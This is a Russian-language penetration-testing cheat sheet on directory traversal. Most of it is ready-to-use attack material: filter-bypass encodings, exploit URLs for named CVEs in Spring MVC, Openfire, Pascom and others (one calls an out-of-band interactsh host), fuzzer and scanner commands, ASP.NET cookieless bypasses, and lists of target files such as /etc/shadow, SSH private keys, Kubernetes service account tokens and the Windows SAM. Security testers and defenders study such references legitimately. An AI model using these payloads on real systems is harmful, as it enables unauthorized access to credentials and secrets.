# Directory Traversal (Обход директорий)
> **Path Traversal**, также известный как **Directory Traversal** (обход директорий), — это тип уязвимости безопасности, возникающий, когда злоумышленник манипулирует переменными, ссылающимися на файлы с помощью последовательностей типа "точка-точка-слеш (`../`)" или подобных конструкций. Это может позволить пользователю получить доступ к произвольным файлам и каталогам, хранящимся в файловой системе.

## Краткое содержание

- [Инструменты](#Инструменты)
- [Методология](#Методология)
    - [URL-кодирование](#URL-кодирование)
    - [Двойное URL-кодирование](#Двойное-URL-кодирование)
    - [Юникод-кодирование](#Юникод-кодирование)
    - [Чрезмерно длинное UTF-8 кодирование (Overlong UTF-8)](#Чрезмерно-длинное-UTF-8-кодирование-Overlong-UTF-8)
    - [Исковерканный путь (Mangled Path)](#Исковерканный-путь-Mangled-Path)
    - [Нулевые байты (NULL Bytes)](#Нулевые-байты-NULL-Bytes)
    - [Реализация обратного прокси](#Реализация-обратного-прокси)
- [Эксплуатация (Exploit)](#Эксплуатация-Exploit)
    - [UNC-путь (UNC Share)](#UNC-путь-UNC-Share)
    - [ASP.NET без Cookie (Cookieless)](#ASPNET-без-Cookie-Cookieless)
    - [Короткие имена файлов в IIS (IIS Short Name)](#Короткие-имена-файлов-в-IIS-IIS-Short-Name)
    - [Протокол URL в Java (Java URL Protocol)](#Протокол-URL-в-Java-Java-URL-Protocol)
- [Обход директорий (Path Traversal)](#Обход-директорий-Path-Traversal)
    - [Файлы Linux](#Файлы-Linux)
    - [Файлы Windows](#Файлы-Windows)
- [Ссылки](#URL)

# Инструменты

* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - Фаззер для поиска уязвимостей обхода директорий.

```python
perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
```

# Методология

Мы можем использовать символы `..` для доступа к родительскому каталогу. Следующие строки представляют собой различные варианты кодирования, которые могут помочь обойти плохо реализованный фильтр.

```python
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

## URL-кодирование

| Символ | Закодированный |
| :----- | :------------- |
| .      | `%2e`          |
| /      | `%2f`          |
| \      | `%5c`          |

**Пример:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion

```python
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```

## Двойное URL-кодирование

Двойное URL-кодирование — это процесс применения URL-кодирования к строке дважды. При URL-кодировании специальные символы заменяются на `%`, за которым следует их шестнадцатеричное значение ASCII. Двойное кодирование повторяет этот процесс для уже закодированной строки.

| Символ | Закодированный |
| :----- | :------------- |
| .      | `%252e`        |
| /      | `%252f`        |
| \      | `%255c`        |

**Пример:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)

```python
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

## Юникод-кодирование

| Символ | Закодированный |
| :----- | :------------- |
| .      | `%u002e`       |
| /      | `%u2215`       |
| \      | `%u2216`       |

**Пример:** Openfire Administration Console - Authentication Bypass (CVE-2023-32315)

```python
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

## Чрезмерно длинное UTF-8 кодирование (Overlong UTF-8)

Стандарт UTF-8 требует, чтобы каждая кодовая точка кодировалась минимальным количеством байт, необходимым для представления её значащих битов. Любое кодирование, использующее больше байт, чем требуется, называется "чрезмерно длинным" и считается недействительным согласно спецификации UTF-8. Это правило обеспечивает взаимно-однозначное соответствие между кодовыми точками и их допустимыми кодировками, гарантируя, что каждая кодовая точка имеет единственное уникальное представление.

| Символ | Закодированный                               |
| :----- | :------------------------------------------- |
| .      | `%c0%2e`, `%e0%40%ae`, `%c0%ae`              |
| /      | `%c0%af`, `%e0%80%af`, `%c0%2f`              |
| \      | `%c0%5c`, `%c0%80%5c`                        |

## Исковерканный путь (Mangled Path)

WAF (межсетевый экран для веб-приложений), который удаляет символы `../` из строк. Просто продублируйте их.

```python
..././
...\..\
```

**Пример:** Mirasys DVMS Workstation <=5.12.6

```python
{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
```

## Нулевые байты (NULL Bytes)

Нулевой байт (`%00`), также известный как нулевой символ, — это специальный управляющий символ (`0x00`) во многих языках программирования и системах. Он часто используется как терминатор строк в языках вроде C и C++. В атаках на обход директорий нулевые байты используются для манипулирования или обхода механизмов проверки вводимых данных на стороне сервера.

**Пример:** Homematic CCU3 CVE-2019-9726

```python
{{BaseURL}}/.%00./.%00./etc/passwd
```

**Пример:** Kyocera Printer d-COPIA253MF CVE-2020-23575

```python
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```

## Реализация обратного прокси

Nginx обрабатывает `/..;/` как каталог, в то время как Tomcat обрабатывает это как `/../`, что позволяет нам получить доступ к произвольным сервлетам.

```python
..;/
```

**Пример:** Pascom Cloud Phone System CVE-2021-45967

Ошибка конфигурации между NGINX и сервером Tomcat на бэкенде приводит к обходу пути на сервере Tomcat, открывая непредусмотренные конечные точки.

```python
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
```

# Эксплуатация (Exploit)

## UNC-путь (UNC Share)

UNC (Universal Naming Convention) путь — это стандартный формат, используемый для указания местоположения ресурсов, таких как общие файлы, каталоги или устройства, в сети платформенно-независимым способом. Обычно используется в средах Windows, но также поддерживается другими операционными системами.

Злоумышленник может внедрить UNC-путь Windows (`\\UNC\share\name`) в программную систему, чтобы потенциально перенаправить доступ в непредусмотренное место или к произвольному файлу.

```python
\\localhost\c$\windows\win.ini
```

Кроме того, машина может аутентифицироваться на этой удаленной шаре, отправляя NTLM-обмен.

## ASP.NET без Cookie (Cookieless)

Когда включено состояние сессии без использования cookie (cookieless session state). Вместо использования cookie для идентификации сессии, ASP.NET изменяет URL, встраивая идентификатор сессии непосредственно в него.

Например, типичный URL может быть преобразован из `http://example.com/page.aspx` во что-то вроде: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`. Значение внутри `(S(...))` — это идентификатор сессии.

| Версия .NET | URI                               |
| :---------- | :-------------------------------- |
| V1.0, V1.1  | `/(XXXXXXXX)/`                    |
| V2.0+       | `/(S(XXXXXXXX))/`                  |
| V2.0+       | `/(A(XXXXXXXX)F(YYYYYYYY))/`       |
| V2.0+       | ...                               |

Мы можем использовать это поведение для обхода фильтруемых URL.

*   Если приложение находится в главной папке:

    ```python
    /(S(X))/
    /(Y(Z))/
    /(G(AAA-BBB)D(CCC=DDD)E(0-1))/
    /(S(X))/admin/(S(X))/main.aspx
    /(S(x))/b/(S(x))in/Navigator.dll
    ```

*   Если приложение находится в подпапке:

    ```python
    /MyApp/(S(X))/
    /admin/(S(X))/main.aspx
    /admin/Foobar/(S(X))/../(S(X))/main.aspx
    ```

| CVE              | Полезная нагрузка (Payload)                              |
| :--------------- | :------------------------------------------------------- |
| CVE-2023-36899   | `/WebForm/(S(X))/prot/(S(X))ected/target1.aspx`        |
| -                | `/WebForm/(S(X))/b/(S(X))in/target2.aspx`               |
| CVE-2023-36560   | `/WebForm/pro/(S(X))tected/target1.aspx/(S(X))/`        |
| -                | `/WebForm/b/(S(X))in/target2.aspx/(S(X))/`              |

## Короткие имена файлов в IIS (IIS Short Name)

Уязвимость коротких имен в IIS использует особенность веб-сервера Microsoft Internet Information Services (IIS), позволяющую злоумышленникам определить существование файлов или каталогов с именами длиннее формата 8.3 (также известного как короткие имена файлов) на веб-сервере.

*   [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

    ```java
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
    ```

*   [bitquark/shortscan](https://github.com/bitquark/shortscan)

    ```python
    shortscan http://example.org/
    ```

## Протокол URL в Java (Java URL Protocol)

Протокол URL в Java при использовании `new URL('')` позволяет использовать формат `url:URL`.

```python
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

# Обход директорий (Path Traversal)

## Файлы Linux

**Операционная система и информация**

```python
/etc/issue
/etc/group
/etc/hosts
/etc/motd
```

**Процессы**

```python
/proc/[0-9]*/fd/[0-9]*   # первое число - PID, второе - дескриптор файла
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
```

**Сеть**

```python
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
```

**Текущий путь**

```python
/proc/self/cwd/index.php
/proc/self/cwd/main.py
```

**Индексация**

```python
/var/lib/mlocate/mlocate.db
/var/lib/plocate/plocate.db
/var/lib/mlocate.db
```

**Учетные данные и история**

```python
/etc/passwd
/etc/shadow
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/etc/mysql/my.cnf
```

**Kubernetes**

```python
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
```

## Файлы Windows

Файлы `license.rtf` и `win.ini` постоянно присутствуют в современных системах Windows, что делает их надежной целью для тестирования уязвимостей обхода путей. Хотя их содержимое не особенно чувствительно или интересно, они хорошо подходят в качестве доказательства концепции (proof of concept).

```python
C:\Windows\win.ini
C:\windows\system32\license.rtf
```

Список файлов/путей для проверки, когда можно читать произвольные файлы в операционной системе Microsoft Windows: **soffensive/windowsblindread**

```python
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```
# URL

* [OWASP Path traversal](https://wiki.owasp.org/index.php/File_System#Path_traversal)
* [Cookieless ASPNET - Soroush Dalili - March 27, 2023](https://twitter.com/irsdl/status/1640390106312835072)
* [CWE-40: Path Traversal: '\UNC\share\name' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
* [Directory traversal - Portswigger - March 30, 2019](https://portswigger.net/web-security/file-path-traversal)
* [Directory traversal attack - Wikipedia - August 5, 2024](https://en.wikipedia.org/wiki/Directory_traversal_attack)
* [EP 057 | Proc filesystem tricks & locatedb abuse with @remsio & @_bluesheet - TheLaluka - November 30, 2023](https://youtu.be/YlZGJ28By8U)
* [NGINX may be protecting your applications from traversal attacks without you even knowing - Rotem Bar - September 24, 2020](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
